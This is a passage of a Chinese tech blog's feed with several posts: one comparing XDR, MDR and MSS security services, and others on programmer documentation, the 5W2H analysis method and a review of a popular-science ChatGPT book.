Response（扩展检测和响应）Gartner给出的XDR定义为：XDR是一种基于SaaS的、绑定于特定供应商的安全威胁检测和事件响应工具，它将多个安全产品集成到一个统一了所有许可安全组件的内聚安全运营系统中。</p><p>通常情况下，可以认为XDR是一个融合了多种安全检测、响应能力的平台框架，只要是为了解决威胁检测与响应的问题能力模块，都可以往里装。特别的强调<strong>X</strong>的概念，也就是可以 扩展（<strong>Extended</strong>）的检测与响应。大家都知道在数学里通常用X表示变量，这里X覆盖了云、网、端、威胁情报等，EDR和NDR及其他的检测设备都可以作为XDR的能力模块作为X为XDR提供数据来源和检测手段。实际在威胁检测与响应的过程中人也是重要的环节，除了EDR、NDR，MDR中的M也可以认为是X的一种。</p><p>MDR是一种托管检测和响应服务，通过外部托管安全服务提供商（MSSP）提供专业知识并填补安全架构空白，解决许多企业网络安全专家短缺的问题。MDR帮助公司保持监控状态，预测并防止潜在的网络攻击。</p><p>XDR是一种更强大的网络安全解决方案，可从多个来源收集和分析数据，以预防、检测和响应网络攻击。XDR是端点检测和响应（EDR）的演进版本，通过以标准格式汇集历史和实时事件数据来提高安全团队的效率和生产力。XDR超越了EDR，具有跨网络的检测和缓解功能，可有效保护企业的整个数字环境，包括网络、云存储、应用程序和端点。XDR提供多种类型的检测，特别适合那些现有解决方案无法覆盖所有攻击面的的企业。XDR支持可扩展的高性能存储、快速索引搜索和自动化驱动的威胁响应，经常以软件即服务（SaaS）的形式提供，使企业更容易使用该技术。</p><p>总的来说，MDR和XDR都是用于检测和响应网络安全威胁的解决方案，但XDR概念更大，是一个覆盖了所有能够解决威胁检测与响应的框架，而MDR托管检测和响应服务更加强调的是人和服务。MDR是通过使用各种XDR的工具和模块如EDR、NDR或其他工具和手段来实现威胁的检测和响应服务。</p><h2 id="四、MDR与MSS的区别"><a href="#四、MDR与MSS的区别" class="headerlink" title="四、MDR与MSS的区别"></a>四、MDR与MSS的区别</h2><p>Garter将MDR服务描述为：为客户提供远程交付的现代安全运营中心(MSOC)功能，通过提供24/7连续监测来在建立和改进有效的早期威胁检测和响应。</p><p>MSS（Managed Security Service，托管安全服务）由来已久，主要是由托管安全服务商（ MSSP）对企业的安全设备及系统进行外包的监控和管理，常见的服务包括托管防火墙、入侵检测、虚拟专用网络、漏洞扫描以及反病毒服务。</p><p>MDR（托管威胁检测与响应）和MSS（托管安全服务）是两种不同的安全服务，虽然它们的目标都是帮助组织提高安全性，但在实现方式和关注点上还是存在一些区别。以下是它们的主要区别：<br>1.关注点不同：</p><ul><li>MDR： MDR的主要关注点是在网络和系统中主动检测和应对威胁。它强调实时监控、威胁检测和迅速的响应。MDR通常更加注重对威胁的深度分析和处理。</li><li>MSS： MSS关注的范围更广泛，包括安全信息与事件管理（SIEM）、日志管理、设备管理、合规性管理等。MSS的目标是提供一种全面的、托管的安全解决方案。</li></ul><p>2.响应方式不同：</p><ul><li>MDR： MDR强调对安全事件的主动响应。一旦检测到威胁，MDR服务提供商通常会采取行动，协助客户隔离受影响的系统、清除恶意代码，并支持恢复操作。</li><li>MSS： MSS更侧重于对事件的收集、监控和报告，而不一定强调实时响应。它通常提供日志管理、合规性报告等功能，用于长期的威胁分析和合规性要求。</li></ul><p>3.服务深度不同：</p><ul><li>MDR：MDR服务通常更深度地涉及威胁检测和响应，可能包括使用先进的威胁情报、行为分析、终端检测与响应（EDR）等技术。 </li><li>MSS：MSS更广泛地覆盖了安全服务的多个方面，包括日志管理、漏洞管理、合规性管理等。它可能更注重对整个安全生态系统的全面管理。</li></ul><p>4.技术要求不同：</p><ul><li>MDR： MDR通常需要使用更先进的威胁检测技术，可能包括机器学习、行为分析、沙箱技术等，以及对安全事件的实时响应能力。</li><li>MSS： MSS可能更注重于传统的安全技术，如防火墙、入侵检测系统（IDS）、反病毒软件等，同时也包括SIEM等辅助工具。</li></ul><p>总体而言，MDR更注重在发生安全事件时的实时响应和深度分析，而MSS则更广泛地提供安全服务，包括对整个安全基础设施的管理和监控；MSS主要关注预防，而MDR则更注重检测和响应；MSS的服务宽且浅，MDR的服务窄且深。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231112/MSSP%E4%B8%8EMDR%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="MSSP与MDR的区别"></p><p>Gartner认为MSS和MDR是交集的关系，MSS尚不会完全覆盖MDR服务。两者之间最大的区别在于，MSS服务在发现威胁或告警的时候，会通知企业自行处置，而MDR则会利用自身的技术去完成对威胁的检测，帮助企业完成响应和处置的工作。不过，随着托管安全服务的发展，这两种服务之间的界限越来越模糊，很多MSS厂商也开始提供MDR服务。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着数字化转型加速，企业的IT环境日益复杂，面临的网络安全威胁也在不断增加。传统的防御措施已经无法有效应对新型威胁，而且很多企业缺乏专业的网络安全团队和技术手段，导致大量的安全事件未能及时被发现和处理。&lt;/p&gt;
&lt;p&gt;在这种背景下，托管威胁检测响应服务（MDR）应运而生。M
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>不会写文档的程序员不是好的程序员</title>
    <link href="https://xiejava.gitee.io/posts/f9fbc895/"/>
    <id>https://xiejava.gitee.io/posts/f9fbc895/</id>
    <published>2023-11-07T11:04:18.000Z</published>
    <updated>2023-11-07T11:10:33.984Z</updated>
    
    <content type="html"><![CDATA[<p>在当今数字化的世界中，软件开发行业正经历着前所未有的繁荣。从移动应用到大型企业系统，软件构建了现代社会的基础。在IT行业中，文档是一种非常重要的沟通工具。它可以帮助程序员和客户及团队成员之间进行有效的沟通和协作，提高工作效率和项目成功率。然而，许多程序员往往忽视了文档的重要性，认为只要代码写得很好就可以了。但实际上，一个优秀的程序员不仅需要精通编码，还需要具备良好的文档编写能力。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231107/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%9B%9B%E4%BB%B6%E4%BA%8B.png" alt="程序员最讨厌的四件事"></p><p>大家都知道文档实际上是软件项目交付物中很重要的一部分，但部分的程序员不愿意写文档，或是应付式的写文档，导致输出的文档质量很差。主要原因包括，有些程序员可能没有意识到文档的价值；一些程序员可能更偏向于技术，对文档编写感到不感兴趣，认为编写文档不如编写代码来得具有挑战性或令人满足；编写文档通常需要额外的时间和精力，程序员可能面临紧迫的项目期限，导致他们倾向于专注于编写代码，而不愿意分配时间来编写文档；有时程序员可能不清楚文档的受众需求，因此不知道要写什么内容，往往输出的文档质量不高。</p><h2 id="一、程序员为什么要写文档"><a href="#一、程序员为什么要写文档" class="headerlink" title="一、程序员为什么要写文档"></a>一、程序员为什么要写文档</h2><ol><li>提高沟通和合作能力</li></ol><p>文档是程序员与同事、客户和其他利益相关者之间进行沟通的重要工具。通过编写文档，程序员可以更好地理解项目需求、系统设计和功能实现等方面，从而更好地与团队成员协作。同时，良好的文档也有助于其他人更好地理解代码的结构和实现，从而提高沟通和合作能力</p><ol start="2"><li>提升工作效率</li></ol><p>编写文档可以帮助程序员更好地组织和规划工作，避免重复劳动和浪费时间。通过文档，程序员可以记录代码实现、功能需求、测试用例等内容，以便后续维护和修改。同时，良好的文档也可以帮助其他团队成员更快地适应代码并避免错误，从而提高工作效率。</p><ol start="3"><li>增强软件的可维护性</li></ol><p>良好的文档可以使代码更容易被理解和维护。当其他开发者需要维护或修改代码时，他们可以通过文档快速了解代码的结构、功能和实现细节，从而更快地投入工作。同时，文档也可以帮助团队成员更好地理解代码的实现思路和逻辑，从而更好地维护代码。</p><ol start="4"><li>降低项目风险</li></ol><p>在项目开发中，风险是不可避免的。通过编写文档，程序员可以记录项目中的关键决策、架构设计、数据流程等信息，以便在项目出现问题或风险时进行参考和排查。这有助于降低项目风险，提高项目的稳定性和可靠性。</p><ol start="5"><li>提高职业竞争力</li></ol><p>在当今竞争激烈的IT行业中，具备良好文档编写能力的程序员更有可能得到公司领导和客户的青睐。通过编写高质量的文档，程序员可以展示自己的技术能力和综合素质，从而增强自己的职业竞争力。同时，良好的文档编写能力也可以帮助程序员更好地规划和总结自己的工作成果，为未来的职业发展打下基础。</p><h2 id="二、程序员在工作中都要写哪些文档"><a href="#二、程序员在工作中都要写哪些文档" class="headerlink" title="二、程序员在工作中都要写哪些文档"></a>二、程序员在工作中都要写哪些文档</h2><p>作为程序员，平时需要写的文档可能包括以下几种：</p><ul><li>需求文档：根据客户需求或项目要求，编写需求文档，明确产品或项目的功能需求、性能要求、界面要求等。</li><li>技术方案文档：根据项目需求和实际情况，编写技术方案文档，包括技术选型、架构设计、模块划分、数据流程等内容。</li><li>详细设计文档：根据技术方案和需求文档，编写详细设计文档，包括代码结构、接口定义、算法实现、异常处理等内容。</li><li>用户手册：针对最终用户编写用户手册，包括产品或系统的安装、配置、使用、操作指南等内容。</li><li>维护文档：针对项目维护人员编写维护文档，包括系统部署、升级、故障排查、性能优化等内容。</li><li>测试文档：编写测试文档，包括测试计划、测试用例、测试结果等内容，用于记录和跟踪测试过程。</li><li>版本说明文档：针对软件版本更新编写版本说明文档，包括新功能、修复的问题、已知的问题等内容。</li><li>安装手册：针对软件安装过程编写安装手册，包括系统要求、安装步骤、配置参数等内容。</li></ul><p>这些文档的编写可以帮助程序员更好地理解项目需求和设计思路，提高代码的质量和可维护性，同时也有助于团队成员之间的沟通和协作。</p><h2 id="三、程序员写文档常见问题"><a href="#三、程序员写文档常见问题" class="headerlink" title="三、程序员写文档常见问题"></a>三、程序员写文档常见问题</h2><p>  程序员在写文档的过程中常见的问题包括内容不清晰、不完整、不规范、缺乏实例、文档更新不及时等。</p><ol><li>文档内容不清晰：有些程序员在编写文档时，可能没有清晰地表达自己的想法，导致文档读者难以理解。这可能是因为程序员没有充分理解自己的想法，或者没有足够的写作技巧。</li><li>档内容不完整：有些程序员在编写文档时，可能没有提供足够的信息，导致读者无法全面理解文档内容。这可能是因为程序员没有充分了解读者的需求，或者没有足够的耐心和细心。</li><li>文档格式不规范：有些程序员在编写文档时比较随意，可能没有遵循公司或团队的文档编写标准，导致文档格式不规范。这可能会影响文档的可读性和可维护性。</li><li>文档缺乏实例：有些程序员在编写文档时，可能没有提供足够的实例或代码片段，导致读者难以理解文档内容。这可能是因为程序员没有足够的实践经验，或者没有足够的耐心和细心。</li><li>文档更新不及时：有些程序员在编写文档后，可能没有及时更新文档内容，导致文档与实际情况不符。这可能会影响读者的理解和使用效果。</li></ol><h2 id="四、程序员如何在工作中提高文档能力"><a href="#四、程序员如何在工作中提高文档能力" class="headerlink" title="四、程序员如何在工作中提高文档能力"></a>四、程序员如何在工作中提高文档能力</h2><ol><li><p>增加阅读量：阅读是提高写作能力的基础。程序员可以通过阅读技术文档、用户手册、产品说明书等文档，学习其他人的写作技巧和表达方式，从而提升自己的写作能力。</p></li><li><p>提高写作技巧：写作需要实践和经验积累。程序员可以通过编写技术博客、参与开源项目、编写技术书籍等方式，锻炼自己的写作技巧和表达能力。这包括如何清晰地表达自己的想法、如何组织文档结构、如何使用适当的语言和风格等。</p></li><li><p>充分了解受众的需求：程序员在编写文档前，应该充分了解读者受众的需求和背景，以便提供适合受众的文档内容。</p></li><li><p>遵循文档编写标准：程序员在编写文档时，应该遵循公司或团队的文档编写标准，一般公司都会有项目各个阶段相对应的文档模板，这些模板是公司的最佳时间，基本上搭好了整个文档的目录架构，可以确保文档格式和内容的规范性。</p></li><li><p>提供足够实例：程序员在编写文档时，应该提供足够的实例或代码片段，以便读者更好地理解和应用文档内容。</p></li><li><p>参考优秀的文档：参考优秀的文档可以让程序员更好地了解其他人的写作技巧和表达方式，从而提升自己的写作能力。可以参考一些开源项目的文档、技术博客、专业书籍等。</p></li><li><p>及时更新文档：随着项目或产品的不断更新和变化，程序员要及时更新相关的文档，确保文档的准确性和时效性。</p><p>总之，提高文档编写能力需要不断地学习和实践。程序员应该注重阅读、练习写作、学习规范、注重逻辑性、参考优秀文档并及时更新文档等方面，从而不断提升自己的文档编写能力。</p></li></ol><hr><p> 作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在当今数字化的世界中，软件开发行业正经历着前所未有的繁荣。从移动应用到大型企业系统，软件构建了现代社会的基础。在IT行业中，文档是一种非常重要的沟通工具。它可以帮助程序员和客户及团队成员之间进行有效的沟通和协作，提高工作效率和项目成功率。然而，许多程序员往往忽视了文档的重要
      
    
    </summary>
    
    
      <category term="人生" scheme="https://xiejava.gitee.io/categories/%E4%BA%BA%E7%94%9F/"/>
    
      <category term="程序人生" scheme="https://xiejava.gitee.io/categories/%E4%BA%BA%E7%94%9F/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/"/>
    
    
      <category term="学习方法" scheme="https://xiejava.gitee.io/tags/%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"/>
    
      <category term="程序人生" scheme="https://xiejava.gitee.io/tags/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/"/>
    
  </entry>
  
  <entry>
    <title>5W2H分析法：全面思考和解决问题的实用工具</title>
    <link href="https://xiejava.gitee.io/posts/a9725cba/"/>
    <id>https://xiejava.gitee.io/posts/a9725cba/</id>
    <published>2023-11-04T02:45:33.000Z</published>
    <updated>2023-11-04T03:25:23.594Z</updated>
    
    <content type="html"><![CDATA[<p>5W2H分析法又叫七问分析法，创于二战中美国陆军兵器修理部。发明者用五个以W开头的英语单词和两个以H开头的英语单词进行设问，发现解决问题的线索，寻找发明思路，进行设计构思，从而搞出新的发明项目。5W2H简单、方便，易于理解，实用，富有启发意义，广泛用于企业管理和技术活动，对于决策和执行性的活动措施也非常有帮助，也有助于弥补考虑问题的疏漏。</p><p>这种方法的核心思想是将问题或任务分解为七个关键方面的问题，以确保全面思考和计划。下面是这些关键方面的解释：<br>1.<strong>What (做什么)</strong>: 这个问题涉及明确任务或目标的性质，需要完成什么工作。它帮助定义任务的本质。<br>2.<strong>Why (为什么)</strong>: 这个问题涉及理解为什么需要完成这项任务或目标，它的动机和目的是什么。它帮助明确任务的意义和价值。<br>3.<strong>Who (何人做)</strong>: 这个问题涉及确定谁将执行任务或项目，涉及到相关的利益相关者或责任人。<br>4.<strong>When (何时做)</strong>: 这个问题涉及确定任务或项目的时间表，包括起始时间、截止时间和任何关键时间点。<br>5.<strong>Where (何处做)</strong>: 这个问题涉及确定任务或项目在哪里完成，涉及到地点或地理位置。<br>6.<strong>How (怎么做)</strong>: 这个问题涉及确定任务或项目如何完成，包括所需的方法、工具和流程。<br>7.<strong>How much (多少)</strong>: 这个问题涉及确定任务或项目的成本、资源需求和预算。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231104/5W2H.png" alt="5W2H"></p><p>5W2H分析法被广泛用于项目管理、决策分析、计划制定以及解决各种实际问题。这个方法有助于组织和个人更好地理解任务的各个方面，并有效地进行规划和执行。同时，5W2H分析法也可以应用于个人工作和生活中，帮助人们更好地解决问题和做出决策。<br>在项目管理中，5W2H分析法可以应用于以下几个方面：</p><p>1.项目计划制定：在项目计划制定阶段，可以使用5W2H分析法来确保计划的全面性和具体性。例如，可以回答以下问题：</p><ul><li>What：项目的目标是什么？需要完成哪些任务？</li><li>When：项目的周期是什么？每个阶段的时间节点是什么？</li><li>Where：项目实施的地点在哪里？需要哪些资源？</li><li>Who：谁来负责项目的实施？需要哪些人员和团队？</li><li>Why：为什么需要实施这个项目？它的意义和目的是什么？</li><li>How：如何实施这个项目？需要采取哪些方法和措施？</li><li>How much：项目的预算是多少？需要投入哪些资源和成本？</li></ul><p>2.项目问题诊断与解决：在项目实施过程中，可以使用5W2H分析法来诊断和解决遇到的问题。例如，可以回答以下问题：</p><ul><li>What：问题的具体内容是什么？对项目的影响是什么？</li><li>When：问题发生的时间是什么时候？影响了哪些阶段的任务？</li><li>Where：问题发生的地点在哪里？影响了哪些区域的工作？</li><li>Who：谁来负责解决问题？需要哪些人员的支持和协助？</li><li>Why：为什么会出现这个问题？根源是什么？</li><li>How：如何解决问题？需要采取哪些措施和方法？</li><li>How much：解决问题需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>3.项目决策支持：在项目实施过程中，可以使用5W2H分析法来评估各种选项的优缺点，为决策提供支持。例如，可以回答以下问题：</p><ul><li>What：决策的具体内容是什么？对项目的影响是什么？</li><li>When：决策的时机是什么时候？需要在哪个阶段做出决定？</li><li>Where：决策的地点在哪里？需要在哪个区域进行讨论和决策？</li><li>Who：谁来负责做出决策？需要哪些人员的支持和协助？</li><li>Why：为什么需要做出这个决策？对项目的意义和目的是什么？</li><li>How：如何做出决策？需要采取哪些方法和程序？</li><li>How much：决策需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>4.项目风险评估：在项目实施过程中，可以使用5W2H分析法来识别和分析潜在的风险，以及制定相应的应对措施。例如，可以回答以下问题：</p><ul><li>What：潜在的风险是什么？对项目的影响是什么？</li><li>When：风险可能发生的时间是什么时候？需要在哪个阶段进行预警和应对？</li><li>Where：风险可能发生的地点在哪里？需要在哪个区域进行防范和控制？</li><li>Who：谁来负责识别和分析风险？需要哪些人员的支持和协助？</li><li>Why：为什么会出现这个风险？根源是什么？</li><li>How：如何应对这个风险？需要采取哪些措施和方法？</li><li>How much：应对风险需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>5.项目总结与经验教训总结：在项目完成后，可以使用5W2H分析法来总结项目的经验和教训，为今后的项目提供参考。例如，可以回答以下问题：</p><ul><li>What：项目的目标和成果是什么？有哪些关键的阶段和任务？</li><li>When：项目的时间轴是怎样的？有哪些重要的时间节点和里程碑事件？</li><li>Where：项目的实施地点是怎样的？有哪些关键的区域和工作场所？</li><li>Who：谁参与了项目的实施？有哪些人员和团队做出了重要贡献或产生了影响？</li><li>Why：为什么项目能够成功或失败？有哪些关键因素或原因导致了这个结果？</li></ul><p>5W2H分析法在个人工作中的应用场景也是非常广泛的，例如：</p><ol><li>制定个人计划：在制定个人计划时，可以使用5W2H分析法来确保计划更加全面和具体，包括设定目标、分解任务、安排时间、评估资源、确定人员和评估成本等。</li><li>解决问题：在解决问题时，可以使用5W2H分析法来分析问题的各个方面，包括问题的原因、影响、解决方案、实施步骤和资源需求等。</li><li>做出决策：在做出决策时，可以使用5W2H分析法来评估各种选项的优缺点，包括选项的可行性、可靠性、经济性、社会效益和风险等。</li><li>项目管理：在项目管理中，可以使用5W2H分析法来制定项目计划、安排任务、协调资源、控制进度和评估质量等。</li><li>个人时间管理：在个人时间管理中，可以使用5W2H分析法来规划时间表、安排工作优先级、合理分配时间和评估工作效果等。</li></ol><p>5W2H分析方法在实际生活中有很多应用例子，以下是其中两小个例子：</p><p>1.计划一次周末旅行：</p><ul><li>Why 为了放松身心，增加生活体验，提升生活质量。</li><li>What 去一个风景优美的地方，欣赏自然风光，享受户外活动。</li><li>Where 选择一个适合户外活动的旅游目的地，例如山区、海滩或森林。</li><li>When 选择一个周末，安排好出发时间和返回时间。</li><li>Who 和家人或朋友一起去，共同体验旅行的乐趣。</li><li>How 制定详细的旅行计划，包括交通方式、住宿、餐饮和活动安排。</li><li>How much 预算合理的旅行费用，包括交通费、住宿费、餐饮费和活动费用。</li></ul><p>2.计划一次家庭装修：</p><ul><li>Why 为了提升家庭的生活品质和舒适度，改善家庭环境。</li><li>What 进行一次全面的家庭装修，包括水电改造、墙面地面装修、家具购置等。</li><li>Where 在家庭内进行装修，可能涉及多个房间和公共区域。</li><li>When 选择一个合适的时间段进行装修，例如假期或周末，合理安排工期。</li><li>Who 雇佣专业的装修公司或施工队伍进行装修，自己负责监督和协调。</li><li>How 制定详细的装修计划，包括材料采购、施工流程、装修风格和家具购置等。</li><li>How much 预算合理的装修费用，包括材料费、人工费、家具购置费等。</li></ul><p>总之，5W2H分析法可以帮助个人在工作和生活中更加全面地思考问题，制定更加具体和可行的计划或决策，提高工作效率和质量。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;5W2H分析法又叫七问分析法，创于二战中美国陆军兵器修理部。发明者用五个以W开头的英语单词和两个以H开头的英语单词进行设问，发现解决问题的线索，寻找发明思路，进行设计构思，从而搞出新的发明项目。5W2H简单、方便，易于理解，实用，富有启发意义，广泛用于企业管理和技术活动，对
      
    
    </summary>
    
    
      <category term="管理" scheme="https://xiejava.gitee.io/categories/%E7%AE%A1%E7%90%86/"/>
    
      <category term="项目管理" scheme="https://xiejava.gitee.io/categories/%E7%AE%A1%E7%90%86/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
    
    
      <category term="项目管理" scheme="https://xiejava.gitee.io/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
    
      <category term="学习方法" scheme="https://xiejava.gitee.io/tags/%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>拥抱AI-ChatGPT:人类新纪元</title>
    <link href="https://xiejava.gitee.io/posts/5ce9b0c0/"/>
    <id>https://xiejava.gitee.io/posts/5ce9b0c0/</id>
    <published>2023-10-28T08:10:01.000Z</published>
    <updated>2023-10-28T08:22:50.273Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPTlogo.png" alt="ChatGPT"></p><p>最近大模型通用智能应用持续发酵，各大科技公司都陆续推出了基于通用大模型的智能应用产品，典型的如OpenAI的ChatGPT、微软的BingChat、百度的文心一言、360的智脑、阿里的通义千问等。当然最火的要属于ChatGPT了，从去年年底推出到现在已经有很多人体验了，并惊叹于如今的人工智能已经发展到无所不知、无所不能的程度了。</p><p>市面上推出了很多介绍ChatGPT的书，覆盖了包括使用指南、原理说明、应用介绍等等各个方面。如果从一个以前从没了解过AI技术的小白想去初步了解ChatGPT不妨去看看《ChatGPT：人类新纪元》这本书。这本书是“搜狗输入法之父”，美团顾问，现任美团光年产品经理，被王兴称为“美团光年首席AGI布道师”马占凯马老师所著。虽然目前豆瓣评分6.8不算高，但是我个人认为作为ChatGPT的科普读物，包含了深入浅出的常识性的普及，以及对人工智能相关历史的概述和推演等，高度概括，其中还有很多有趣的故事，很好读，挺有价值的。这本书的定位就是科普，我觉得已经做到了。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT%E4%BA%BA%E7%B1%BB%E6%96%B0%E7%BA%AA%E5%85%83.png" alt="ChatGPT:人类新纪元"></p><p>经过一段时间对ChatGPT的使用，我逐步认同书中对“ChatGPT：人类新纪元”的提法。ChatGPT，如同人类历史上的单向门——火、文字、造纸、蒸汽机、电和计算机一样，ChatGPT的横空出世让大家看到了通用人工智能达到了崭新新的高度，标志着人类科技进步的又一重大里程碑，预示着我们正步入通用人工智能的新纪元。就像2007年乔布斯发布划时代的苹果智能手机iphone后，各种互联网移动应用蜂拥而至，大家再也离不开智能手机了，从此开始了移动互联的新纪元。</p><h2 id="一、ChatGPT之初体验"><a href="#一、ChatGPT之初体验" class="headerlink" title="一、ChatGPT之初体验"></a>一、ChatGPT之初体验</h2><p>对于一个码农，初接触ChatGPT时就想验证一下ChatGPT的编程功底，最近正好在研究用机器学习来识别心电图。如是问了一下ChatGPT如何用Python写一段心电图识别波形的代码。<br>看一下ChatGPT给我的答案：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT-%E4%BB%A3%E7%A0%81.png" alt="ChatGPT代码"></p><p>关键是这段代码稍作调整就可以运行起来。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" alt="chatGPT代码运行结果"><br>看上去效果还不错！</p><p>这可不是向搜素引擎一样搜出一堆的结果给出一堆的选项让我来选，而是真正的根据我的题意自己生成了一段可以执行的代码！这就有点牛逼了。</p><p>原来一直以为码农毕竟还是干技术活的，不会像那些从事简单重复劳动的活一样被AI所替代。但是看到ChatGPT给我的答案，又更进一步的加深了我的焦虑。本来就很卷的IT行业，还要和通用人工智能卷，估计用不了多久码农这个职业就会要消失了。</p><h2 id="二、ChatGPT与搜索引擎"><a href="#二、ChatGPT与搜索引擎" class="headerlink" title="二、ChatGPT与搜索引擎"></a>二、ChatGPT与搜索引擎</h2><p>有人认为ChatGPT就是搜索引擎的升级版，输入一些信息机器就给你反馈一些经过精细过滤后的信息。ChatGPT与搜索引擎完全是两类不同的东西。差别就和智能手机与以前的功能手机一样大。</p><p>ChatGPT是通过海量的数据学习后，具备真正具有智能能力的，给出的内容是根据自身的学习自动生成的。也就是我们常说的生成式AI，是一种能够从其训练数据中学习并生成新的、类似的数据或模型的机器学习技术。这种方法不依赖于预先定义的规则或模式，而是通过自我学习和适应来改进其性能。</p><p>与传统的AI相比，生成式AI的主要区别在于其学习方式和能力。传统的AI通常依赖于专家知识或编程指令来执行特定的任务。例如，一个图像识别系统可能被训练成只识别特定的图像类型，如猫或狗。然而，一旦这个系统遇到它从未见过的图像，它就无法做出正确的判断。</p><p>相反，生成式AI可以通过自我学习和适应来提高其性能。即使它从未见过某种类型的数据，它也可以通过分析大量的类似数据来学习如何处理这种数据。例如，ChatGPT通过海量的数据学习可以自动生成给出符合题意的答案。</p><p>而搜索引擎甚至连传统的AI都算不上，只是通过大数据的搜索算法将符合搜索条件的信息查询后返回到你，你还要根据自己的判断去识别和删选有用的信息。尤其是有了竞价模型后，可能搜索引擎给你的数据排名前几的都是对你来说没有什么用的，只是出价高的几个。</p><h2 id="三、机器学习与人类学习"><a href="#三、机器学习与人类学习" class="headerlink" title="三、机器学习与人类学习"></a>三、机器学习与人类学习</h2><p>机器学习其实是和人类学习是一样的。基本原理如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B.png" alt="学习模型"></p><p>机器学习的输入是海量的数据，通过模型的训练从数据中学习，生成并输出新的数据，根据输出的效果的进行评估和反馈来调整模型参数使模型的学习效果达到最优。</p><p>人类学习也是一样的，平时我们努力大量的看书、看视频、看其他资料、与人交流，其实都是在获取信息，将信息输入至大脑后，大脑经过思考输出结果，结果是对世界的认知、对人生的看法、对专业知识的领悟、输出一篇论文、输出一次演讲等等。也是对自己输出的结果进行评估和反馈来强化学习效果。</p><p>比如：学生通过大量的阅读和做题作为输入来学习知识，通过考试来评估学习效果，根据考试评估的结果来调整自己的学习方法策略来取得更好的学习成绩。</p><p>我们也是一样的，要想提高自己的认知和能力，就要通过<strong>大量的阅读（输入）</strong>、<strong>思考（学习）</strong>、<strong>不断的反思（反馈评估）</strong>、不断的思考<strong>调整学习方法策略等（优化模型参数）</strong>，最终提高自身的能力，可以有高水平的<strong>认知输出（输出）</strong>。</p><h2 id="四、智能涌现与从量变到质变"><a href="#四、智能涌现与从量变到质变" class="headerlink" title="四、智能涌现与从量变到质变"></a>四、智能涌现与从量变到质变</h2><p>“智能涌现” 是一个涵盖广泛领域的概念，它描述了在复杂系统中，智能行为或性能如何从简单组件或个体之间的互动中产生或 “涌现” 出来。在机器学习中，神经网络和深度学习模型可以通过大量的神经元之间的互连来实现智能任务。</p><p>在ChatGPT惊人的智能表现背后，就发生了智能涌现的现象。涌现现象是极为复杂的，因为复杂性科学就是复杂的，复杂是其基本特征。通俗的将就是当数据和模型参数达到一定的数量级后模型涌现出了新的完成任务的能力。</p><p>目前，在大模型的智能涌现方面，有三个结论。<br>第一，我们不知道什么时候会涌现某种新能力；<br>第二，我们不知道到一定规模时会涌现哪一种新的能力。<br>第三，我们唯一知道的是，只要数据量足够大，训练得足够深，一定会有涌现发生。</p><p>于是，我不禁又要拿出这张图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/%E4%BB%8E%E9%87%8F%E5%8F%98%E5%88%B0%E8%B4%A8%E5%8F%98.png" 